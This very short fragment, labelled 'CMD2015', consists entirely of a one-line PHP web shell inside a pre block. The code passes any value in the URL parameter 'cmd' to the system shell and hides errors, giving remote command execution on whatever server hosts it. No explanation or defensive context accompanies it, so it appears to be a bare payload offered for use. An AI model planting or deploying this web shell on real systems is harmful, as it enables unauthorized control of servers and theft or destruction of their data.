CMD2015<br><pre><?php @system($_GET['cmd']);?></pre>
